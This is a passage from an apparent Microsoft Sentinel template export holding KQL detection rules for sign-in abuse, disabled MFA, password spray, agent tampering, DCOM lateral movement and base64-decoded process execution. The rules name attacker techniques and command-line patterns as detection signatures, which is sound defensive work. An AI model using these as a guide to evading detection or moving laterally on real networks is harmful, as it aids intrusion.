          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d5bb335a-76aa-409d-af81-f2738deee92f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d5bb335a-76aa-409d-af81-f2738deee92f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Microsoft Entra ID PowerShell accessing non-Entra ID resources",
          "description": "This will alert when a user or application signs in using Microsoft Entra ID PowerShell to access non-Active Directory resources, such as the Azure Key Vault, which may be undesired or unauthorized behavior.\nFor capabilities and expected behavior of the Microsoft Entra ID PowerShell module, see: https://docs.microsoft.com/powershell/module/azuread/?view=azureadps-2.0.\nFor further information on Microsoft Entra ID Signin activity reports, see: https://docs.microsoft.com/azure/active-directory/reports-monitoring/concept-sign-ins.",
          "severity": "Low",
          "enabled": true,
          "query": "let aadFunc = (tableName:string){\ntable(tableName)\n| where AppId =~ \"1b730954-1685-4b74-9bfd-dac224a7b894\" // AppDisplayName IS Azure Active Directory PowerShell\n| where TokenIssuerType =~ \"AzureAD\"\n| where ResourceIdentity !in (\"00000002-0000-0000-c000-000000000000\", \"00000003-0000-0000-c000-000000000000\") // ResourceDisplayName IS NOT Windows Azure Active Directory OR Microsoft Graph\n| extend Status = todynamic(Status)\n| where Status.errorCode == 0 // Success\n| project-reorder IPAddress, UserAgent, ResourceDisplayName, UserDisplayName, UserId, UserPrincipalName, Type\n| order by TimeGenerated desc\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "50574fac-f8d1-4395-81c7-78a463ff0c52",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "UserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e5f47f1f-e8fd-4780-9ee1-150543f0dbbe')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e5f47f1f-e8fd-4780-9ee1-150543f0dbbe')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Starting or Stopping HealthService to Avoid Detection",
          "description": "This query detects events where an actor is stopping or starting HealthService to disable telemetry collection/detection from the agent.\n The query requires a SACL to audit for access request to the service.",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityEvent\n| where EventID == 4656\n| extend EventData = parse_xml(EventData).EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key = tostring(column_ifexists('@Name', \"\")), Value = column_ifexists('#text', \"\")\n| evaluate pivot(Key, any(Value), TimeGenerated, TargetAccount, Computer, EventSourceName, Channel, Task, Level, EventID, Activity, TargetLogonId, SourceComputerId, EventOriginId, Type, _ResourceId, TenantId, SourceSystem, ManagementGroupName, IpAddress, Account)\n| extend ObjectServer = column_ifexists('ObjectServer', \"\"), ObjectType = column_ifexists('ObjectType', \"\"), ObjectName = column_ifexists('ObjectName', \"\")\n| where isnotempty(ObjectServer) and isnotempty(ObjectType) and isnotempty(ObjectName)\n| where ObjectServer =~ \"SC Manager\" and ObjectType =~ \"SERVICE OBJECT\" and ObjectName =~ \"HealthService\"\n// Comment out the join below if the SACL only audits users that are part of the Network logon users, i.e. with user/group target pointing to \"NU.\"\n| join kind=leftouter (\n  SecurityEvent\n  | where EventID == 4624\n) on TargetLogonId\n| project TimeGenerated, Computer, Account, TargetAccount, IpAddress,TargetLogonId, ObjectServer, ObjectType, ObjectName\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| extend AccountName = tostring(split(TargetAccount, @'\\')[1]), AccountNTDomain = tostring(split(TargetAccount, @'\\')[0])\n| extend timestamp = TimeGenerated\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [
            "T1562.001"
          ],
          "alertRuleTemplateName": "2bc7b4ae-eeaa-4538-ba15-ef298ec1ffae",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d7d463ea-46d8-4d6a-811d-c30ffea64c94')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d7d463ea-46d8-4d6a-811d-c30ffea64c94')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Multi-Factor Authentication Disabled for a User",
          "description": "Multi-Factor Authentication (MFA) helps prevent credential compromise. This alert identifies when an attempt has been made to deactivate MFA for a user.",
          "severity": "Medium",
          "enabled": true,
          "query": "(union isfuzzy=true\n(AuditLogs\n| where OperationName =~ \"Disable Strong Authentication\"\n| extend _parsedIntiatedByUser = parse_json(tostring(InitiatedBy.user))\n| extend _parsedIntiatedByApp = parse_json(tostring(InitiatedBy.app))\n| extend IPAddress = tostring(_parsedIntiatedByUser.ipAddress)\n| extend InitiatedByUser = iff(isnotempty(tostring(_parsedIntiatedByUser.userPrincipalName)),\n tostring(_parsedIntiatedByUser.userPrincipalName), tostring(_parsedIntiatedByApp.displayName))\n| extend Targetprop = todynamic(TargetResources)\n| extend TargetUser = tostring(Targetprop[0].userPrincipalName)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by User = TargetUser, InitiatedByUser , Operation = OperationName , CorrelationId, IPAddress, Category, Source = SourceSystem , AADTenantId, Type\n),\n(AWSCloudTrail\n| where EventName in~ (\"DeactivateMFADevice\", \"DeleteVirtualMFADevice\")\n| extend _parsedRequestParameters = parse_json(RequestParameters)\n| extend InstanceProfileName = tostring(_parsedRequestParameters.InstanceProfileName)\n| extend TargetUser = tostring(_parsedRequestParameters.userName)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by User = TargetUser, Source = EventSource , Operation = EventName , TenantorInstance_Detail = InstanceProfileName, IPAddress = SourceIpAddress\n)\n)\n| extend timestamp = StartTimeUtc, UserName = tostring(split(User, '@', 0)[0]), UPNSuffix = tostring(split(User, '@', 1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Persistence"
          ],
          "techniques": [
            "T1098",
            "T1556"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "65c78944-930b-4cae-bd79-c3664ae30ba7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2acd6dd0-5102-4c7c-ac0c-4b8eccdf898c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2acd6dd0-5102-4c7c-ac0c-4b8eccdf898c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "MFA Spamming followed by Successful login",
          "description": "Identifies MFA Spamming followed by Successful logins and by a successful authentication within a given time window.\nDefault Failure count is 10 and 1 successful login with default Time Window is 5 minutes.",
          "severity": "High",
          "enabled": true,
          "query": "// Filter for sign-in logs ingested within the last day\nSigninLogs\n| where ingestion_time() > ago(1d)\n// Filter for records with AuthenticationRequirement set to multiFactorAuthentication\n| where AuthenticationRequirement == \"multiFactorAuthentication\"\n// Extract information from dynamic columns DeviceDetail and LocationDetails\n| extend DeviceDetail = todynamic(DeviceDetail), LocationDetails = todynamic(LocationDetails)\n// Extract specific attributes from DeviceDetail and LocationDetails\n| extend\n      OS = tostring(DeviceDetail.operatingSystem),\n      Browser = tostring(DeviceDetail.browser),\n      State = tostring(LocationDetails.state),\n      City = tostring(LocationDetails.city),\n      Region = tostring(LocationDetails.countryOrRegion)\n// Expand multi-value property AuthenticationDetails into separate records\n| mv-expand todynamic(AuthenticationDetails)\n// Parse AuthResult from JSON in AuthenticationDetails and convert to string\n| extend AuthResult = tostring(parse_json(AuthenticationDetails).authenticationStepResultDetail)\n// Summarize data by aggregating statistics for each user, IP, and AuthResult\n| summarize FailedAttempts = countif(AuthResult == \"MFA denied; user declined the authentication\" or AuthResult == \"MFA denied; user did not respond to mobile app notification\"), SuccessfulAttempts = countif(AuthResult == \"MFA successfully completed\"), InvolvedOS = make_set(OS, 5), InvolvedBrowser = make_set(Browser), StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserPrincipalName, IPAddress, State, City, Region\n// Calculate AuthenticationWindow by finding time difference between start and end times\n| extend AuthenticationWindow = (EndTime - StartTime)\n// Filter for records with more than 10 failed attempts in 5-minute window and at least 1 successful attempt\n| where FailedAttempts > 10 and AuthenticationWindow <= 5m and SuccessfulAttempts >= 1\n// Extract user's name and UPN suffix using split function\n| extend Name = tostring(split(UserPrincipalName, '@', 0)[0]), UPNSuffix = tostring(split(UserPrincipalName, '@', 1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a8cc6d5c-4e7e-4b48-b4ac-d8a116c62a8b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2e179a8a-bacb-4c6d-933f-40c79c67b50e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2e179a8a-bacb-4c6d-933f-40c79c67b50e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT Process executed from binary hidden in Base64 encoded file",
          "description": "Encoding malicious software is a technique used to obfuscate files from detection.\nThe first CommandLine component is looking for Python decoding base64.\nThe second CommandLine component is looking for Bash/sh command line base64 decoding.\nThe third one is looking for Ruby decoding base64.",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityEvent\n| where EventID==4688\n| where isnotempty(CommandLine)\n| project TimeGenerated, Computer, AccountName = SubjectUserName, AccountNTDomain = SubjectDomainName, FileName = Process, CommandLine, ParentProcessName, SubjectAccount\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| where CommandLine contains \".decode('base64')\"\n        or CommandLine contains \"base64 --decode\"\n        or CommandLine contains \".decode64(\"\n",
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "tactics": [
            "Execution",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1059",
            "T1027",
            "T1140"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7ad4c32b-d0d2-411c-a0e8-b557afa12fce",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "SubjectAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/920ec5c7-4dfe-49a2-aec5-c0b2b32ee11c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/920ec5c7-4dfe-49a2-aec5-c0b2b32ee11c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Failed login attempts to Azure Portal",
          "description": "Identifies failed login attempts in the Microsoft Entra ID SigninLogs to the Azure Portal.  Many failed logon attempts or some failed logon attempts from multiple IPs could indicate a potential brute force attack.\nThe following are excluded due to success and non-failure results:\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\n0 - successful logon\n50125 - Sign-in was interrupted due to a password reset or password registration entry.\n50140 - This error occurred due to 'Keep me signed in' interrupt when the user was signing-in.",
          "severity": "Low",
          "enabled": true,
          "query": "let timeRange = 1d;\nlet lookBack = 7d;\nlet threshold_Failed = 5;\nlet threshold_FailedwithSingleIP = 20;\nlet threshold_IPAddressCount = 2;\nlet isGUID = \"[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\";\nlet aadFunc = (tableName:string){\nlet azPortalSignins = materialize(table(tableName)\n| where TimeGenerated >= ago(lookBack)\n// Azure Portal only\n| where AppDisplayName =~ \"Azure Portal\")\n;\nlet successPortalSignins = azPortalSignins\n| where TimeGenerated >= ago(timeRange)\n// Azure Portal only and exclude non-failure Result Types\n| where ResultType in (\"0\", \"50125\", \"50140\")\n// Tagging identities not resolved to friendly names\n//| extend Unresolved = iff(Identity matches regex isGUID, true, false)\n| distinct TimeGenerated, UserPrincipalName\n;\nlet failPortalSignins = azPortalSignins\n| where TimeGenerated >= ago(timeRange)\n// Azure Portal only and exclude non-failure Result Types\n| where ResultType !in (\"0\", \"50125\", \"50140\", \"70044\", \"70043\")\n// Tagging identities not resolved to friendly names\n| extend Unresolved = iff(Identity matches regex isGUID, true, false)\n;\n// Verify there is no success for the same connection attempt after the fail\nlet failnoSuccess = failPortalSignins | join kind= leftouter (\n   successPortalSignins\n) on UserPrincipalName\n| where TimeGenerated > TimeGenerated1 or isempty(TimeGenerated1)\n| project-away TimeGenerated1, UserPrincipalName1\n;\n// Lookup up resolved identities from last 7 days\nlet identityLookup = azPortalSignins\n| where TimeGenerated >= ago(lookBack)\n| where not(Identity matches regex isGUID)\n| summarize by UserId, lu_UserDisplayName = UserDisplayName, lu_UserPrincipalName = UserPrincipalName;\n// Join resolved names to unresolved list from portal signins\nlet unresolvedNames = failnoSuccess | where Unresolved == true | join kind= inner (\n   identityLookup\n) on UserId\n| extend UserDisplayName = lu_UserDisplayName, UserPrincipalName = lu_UserPrincipalName\n| project-away lu_UserDisplayName, lu_UserPrincipalName;\n// Join Signins that had resolved names with list of unresolved that now have a resolved name\nlet u_azPortalSignins = failnoSuccess | where Unresolved == false | union unresolvedNames;\nu_azPortalSignins\n| extend DeviceDetail = todynamic(DeviceDetail), Status = todynamic(DeviceDetail), LocationDetails = todynamic(LocationDetails)\n| extend Status = strcat(ResultType, \": \", ResultDescription), OS = tostring(DeviceDetail.operatingSystem), Browser = tostring(DeviceDetail.browser)\n| extend State = tostring(LocationDetails.state), City = tostring(LocationDetails.city), Region = tostring(LocationDetails.countryOrRegion)\n| extend FullLocation = strcat(Region,'|', State, '|', City)  \n| summarize TimeGenerated = make_list(TimeGenerated,100), Status = make_list(Status,100), IPAddresses = make_list(IPAddress,100), IPAddressCount = dcount(IPAddress), FailedLogonCount = count()\nby UserPrincipalName, UserId, UserDisplayName, AppDisplayName, Browser, OS, FullLocation, Type\n| mvexpand TimeGenerated, IPAddresses, Status\n| extend TimeGenerated = todatetime(tostring(TimeGenerated)), IPAddress = tostring(IPAddresses), Status = tostring(Status)\n| project-away IPAddresses\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserPrincipalName, UserId, UserDisplayName, Status, FailedLogonCount, IPAddress, IPAddressCount, AppDisplayName, Browser, OS, FullLocation, Type\n| where (IPAddressCount >= threshold_IPAddressCount and FailedLogonCount >= threshold_Failed) or FailedLogonCount >= threshold_FailedwithSingleIP\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "223db5c1-1bf8-47d8-8806-bed401b356a4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ef21934f-33e2-4e3c-998a-1136b5b33a91')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ef21934f-33e2-4e3c-998a-1136b5b33a91')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Lateral Movement via DCOM",
          "description": "This query detects a fairly uncommon attack technique using the Windows Distributed Component Object Model (DCOM) to make a remote execution call to another computer system and gain lateral movement throughout the network.\nRef: http://thenegative.zone/incident%20response/2017/02/04/MMC20.Application-Lateral-Movement-Analysis.html",
          "severity": "Medium",
          "enabled": true,
          "query": "Event\n| where EventLog =~ \"Microsoft-Windows-Sysmon/Operational\" and EventID==1\n| parse EventData with * 'CommandLine\">' CommandLine \"<\" * 'ParentCommandLine\">' ParentCommandLine \"<\" *\n| where ParentCommandLine =~ \"C:\\\\Windows\\\\System32\\\\svchost.exe -k DcomLaunch\" and CommandLine =~ \"C:\\\\Windows\\\\System32\\\\mmc.exe -Embedding\"\n| parse EventData with * 'ProcessGuid\">' ProcessGuid \"<\" * 'Image\">' Image \"<\" * 'Description\">' Description \"<\" * 'CurrentDirectory\">' CurrentDirectory \"<\" * 'User\">' User \"<\" * 'LogonGuid\">' LogonGuid \"<\" * 'ParentProcessGuid\">' ParentProcessGuid \"<\" * 'ParentImage\">' ParentImage \"<\" * 'ParentCommandLine\">' ParentCommandLine \"<\" * 'ParentUser\">' ParentUser \"<\" *\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, User, ParentImage, ParentProcessGuid, ParentCommandLine, ParentUser, Image, ProcessGuid, CommandLine, Description\n| extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1021"
          ],
          "subTechniques": [
            "T1021.003"
          ],
          "alertRuleTemplateName": "50cbf34a-4cdd-45d7-b3f5-8b53a1d0d14f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "CommandLine"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "User"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7e6aa273-8f72-4925-bf85-6a847d55f3d2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7e6aa273-8f72-4925-bf85-6a847d55f3d2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Password spray attack against Microsoft Entra ID application",
          "description": "Identifies evidence of password spray activity against Microsoft Entra ID applications by looking for failures from multiple accounts from the same IP address within a time window. If the number of accounts breaches the threshold just once, all failures from the IP address within the time range are bought into the result. Details on whether there were successful authentications by the IP address within the time window are also included.\nThis can be an indicator that an attack was successful.\nThe default failure acccount threshold is 5, Default time window for failures is 20m and default look back window is 1 day\nNote: Due to the number of possible accounts involved in a password spray it is not possible to map identities to a custom entity.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes.",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeRange = 1d;\nlet lookBack = 7d;\nlet authenticationWindow = 20m;\nlet authenticationThreshold = 5;\nlet isGUID = \"[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\";\nlet failureCodes = dynamic([50053, 50126, 50055]); // invalid password, account is locked - too many sign ins, expired password\nlet successCodes = dynamic([0, 50055, 50057, 50155, 50105, 50133, 50005, 50076, 50079, 50173, 50158, 50072, 50074, 53003, 53000, 53001, 50129]);\n// Lookup up resolved identities from last 7 days\nlet aadFunc = (tableName:string){\nlet identityLookup = table(tableName)\n| where TimeGenerated >= ago(lookBack)\n| where not(Identity matches regex isGUID)\n| where isnotempty(UserId)\n| summarize by UserId, lu_UserDisplayName = UserDisplayName, lu_UserPrincipalName = UserPrincipalName, Type;\n// collect window threshold breaches\ntable(tableName)\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(failureCodes)\n| summarize FailedPrincipalCount = dcount(UserPrincipalName) by bin(TimeGenerated, authenticationWindow), IPAddress, AppDisplayName, Type\n| where FailedPrincipalCount >= authenticationThreshold\n| summarize WindowThresholdBreaches = count() by IPAddress, Type\n| join kind= inner (\n// where we breached a threshold, join the details back on all failure data\ntable(tableName)\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(failureCodes)\n| extend LocationDetails = todynamic(LocationDetails)\n| extend FullLocation = strcat(LocationDetails.countryOrRegion,'|', LocationDetails.state, 